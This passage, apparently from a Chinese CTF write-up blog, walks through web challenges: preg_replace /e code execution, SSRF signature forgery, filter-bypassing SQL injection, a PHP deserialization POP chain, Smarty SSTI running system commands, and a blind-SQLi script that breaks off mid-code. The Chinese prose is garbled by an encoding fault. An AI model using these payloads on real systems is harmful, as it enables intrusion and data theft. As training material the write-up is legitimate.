punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ—¶å€™è¦ç”¨ä¸€ä¸ªæ­£åˆ™çš„æ¼æ´<a href="https://www.cesafe.com/html/6999.html">Preg_Replaceä»£ç æ‰§è¡Œæ¼æ´è§£æ</a></p><p>æ„é€ å‡ºæ­£åˆ™å†…å®¹ä¸º</p><p>re=\S*ï¼ˆå¤šæ¬¡åŒ¹é…éç©ºå­—ç¬¦ï¼‰</p><p>str=${phpinfo()}</p><p>æµ‹è¯•æˆåŠŸ</p><p>è¿›è€Œä½¿ç”¨getFlagå‡½æ•°æ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">payload:next.php?\S*&#x3D;&#123;$&#123;getFlag()&#125;&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>ä¸Šæ¥å°±æ˜¯ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment"># #encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> <span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check <span class="token operator">=</span> param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä»£ç å…³é”®ç‚¹å°±æ˜¯<code>Task</code>ç±»ä¸­çš„å‡½æ•°æ‰§è¡Œï¼Œåˆ†æå¾—å‡ºåªè¦<code>action</code>ä¸­åŒæ—¶å«æœ‰scanå’Œreadå³å¯è¯»å–å‡ºæ–‡ä»¶å¹¶è¿”å›ï¼Œè€Œåœ¨<code>De1ta</code>è·¯å¾„ä¸­æœ‰åˆ›å»º<code>Task</code>ç±»çš„è¿‡ç¨‹ï¼Œ<code>geneSign</code>è·¯å¾„ä¸­å¯ä»¥è·å–signå€¼ï¼Œæ‰€ä»¥è®©<code>action=scanread&amp;parma=flag.txt</code>ï¼Œé€šè¿‡<code>geneSign</code>è·¯å¾„è·å–signå³å¯ï¼Œ<code>getSign</code>å‡½æ•°ä¸­md5å†…å®¹çš„æ‹¼æ¥ï¼Œæ˜¯<code>secert_key + param + action</code>ï¼Œè€Œå¯¹äº<code>geneSign</code>è·¯å¾„æ¥è¯´ï¼Œactionæ°¸è¿œä¸ºscanï¼Œæ‰€ä»¥geneSignç»“æœå°±æ˜¯<code>secert_key + param + &#39;scan&#39;</code>æ‹¼æ¥å‡ºå¸¦æœ‰åŒæ—¶å¸¦æœ‰scanå’Œreadåªè¦è®©<code>param=flag.txtread</code>å³å¯ï¼Œä¼ å…¥<code>geneSign</code>æ‹¿åˆ°signå€¼</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-29">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-29</a> 15.50.50.png)</p><p>æœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:De1ta?param&#x3D;flag.txtCookie: action&#x3D;readscan;sign&#x3D;1983e9273c0ae452b67ccecb2fb88ed2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>è¯¦è§è¯¥é¢˜ï¼š[BUUCTF 2018]Online Tool</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>æ˜¯SQLæ³¨å…¥</p><p>1ã€ç©ºæ ¼è¿‡æ»¤</p><p>2ã€æ³¨é‡Šç¬¦è¿‡æ»¤</p><p>3ã€<a href="https://www.anquanke.com/post/id/193512">information_schemaç»•è¿‡</a></p><p>4ã€æ— åˆ—åæ³¨å…¥</p><p>ç¬¬ä¸€ä¸ªç”¨/**/ç»•è¿‡å°±è¡Œ</p><p>ç¬¬äºŒä¸ªæœ«å°¾åŠ å•å¼•å·é—­åˆå°±è¡Œ</p><p>æœ€åä¸€ä¸ªä½¿ç”¨innodbå¼•æ“ç»•è¿‡</p><p>æ¡ä»¶æ˜¯MySQLç‰ˆæœ¬&gt;5.5</p><p>è¡¨ååœ¨innodb_table_stats</p><p>åˆ—ååœ¨innodb_table_index</p><p>select table_name from mysql.innodb_table_stats where database_name=database()</p><p>é¦–å…ˆæ˜¯æµ‹è¯•åˆ—æ•°ï¼Œä¸º22åˆ—ï¼Œå›æ˜¾åœ¨2ï¼Œ3ä½ï¼Œç„¶åçˆ†è¡¨å</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from(mysql.innodb_table_stats)where(database_name&#x3D;database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¡¨åï¼šadsï¼Œusers</p><p>æ— åˆ—åæ³¨å…¥</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">select 1,2,3 union select * from admin;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·çš„è¯union selectçš„å†…å®¹å°±æ˜¯å‰ä¸‰åˆ—çš„å†…å®¹</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">select `3` from (select 1,2,3 union select * from admin)a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…</p><pre class="line-numbers language-none"><code class="language-none">select b from (select 1,2,3 as b union select * from admin)a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±æ˜¯ç¬¬ä¸‰åˆ—çš„å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">payload:-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Welcome to index.php&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95&#x2F;&#x2F;And Crack It!class Modifier &#123;    protected $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–ä¸ç”¨å¤šè¯´ï¼Œæœ€ååº”è¯¥æ–‡ä»¶åŒ…å«åŠ PHPä¼ªåè®®è¯»å–ï¼Œæ‰¾é“¾å­</p><p><code>__invoke</code>éœ€è¦ä»¥å‡½æ•°è°ƒç”¨ç±»ï¼Œåœ¨Testçš„<code>__get</code>æ–¹æ³•ä¸­ï¼Œ<code>__get</code>æ–¹æ³•åœ¨Showä¸­<code>__toString</code>è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨ï¼Œæœ€ç»ˆæ„é€ å‡ºçš„å°±æ˜¯</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;    public function __toString()&#123;        return &quot;output anything you want&quot;;    &#125;&#125;class Test&#123;    public $p;&#125;$payload &#x3D; new Show(&#39;test&#39;);$payload-&gt;str &#x3D; new Test();$payload-&gt;str-&gt;p &#x3D; new Modifier();$hack &#x3D; new Show($payload);echo urlencode(serialize($hack));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†…å®¹base64è§£ç å³å¯</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†æ—¶é—´æ˜¾ç¤ºæ‰€ä½¿ç”¨çš„./time.php?source</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;        $this-&gt;b &#x3D; &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a &#x3D; $this-&gt;a;        $b &#x3D; $this-&gt;b;        echo $b($a);    &#125;&#125;$c &#x3D; new HelloPhp;if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–æ„é€ å‡ºä»¥bä¸ºå‡½æ•°åï¼Œä»¥aä¸ºå‚æ•°çš„å‡½æ•°æ‰§è¡Œå³å¯ï¼Œå°è¯•systemå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå¯èƒ½æ˜¯è¢«è¿‡æ»¤ï¼Œå†å°è¯•evalï¼Œä¹Ÿè¢«è¿‡æ»¤ï¼Œæ”¾å¼ƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå°è¯•æ‰§è¡Œphpå‡½æ•°ï¼Œä½¿ç”¨assertåŒ…è£¹phpinfo()ï¼ŒæŸ¥æ‰¾flagæˆåŠŸ</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>åœ¨XFFä½ç½®å°è¯•SSTIæˆåŠŸï¼Œè¾“å…¥æŠ¥é”™å‘ç°ä½¿ç”¨çš„æ˜¯smartyæ¸²æŸ“ï¼Œ{system(â€˜ls /â€˜)}å‘ç°flagï¼Œ{system(â€˜cp /flag /var/www/html/flag.txtâ€™)}å°†æ–‡ä»¶å¸¦å‡ºå³å¯</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>ç‚¹æç¤ºå‘ç°æ³¨å…¥ç‚¹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œè¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨</p><pre class="line-numbers language-none"><code class="language-none">çˆ†åº“åï¼šid&#x3D;2^(ascii(substr((select(database())),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)æ­£ç¡®è¿”å›3ï¼Œé”™è¯¯è¿”å›2çˆ†è¡¨åid&#x3D;2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)çˆ†åˆ—åid&#x3D;2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆpayloadè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php"</span>name<span class="token operator">=</span><span class="token string">",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;1234567890-bcde&#125;,"</span><span class="token keyword">for</span> i 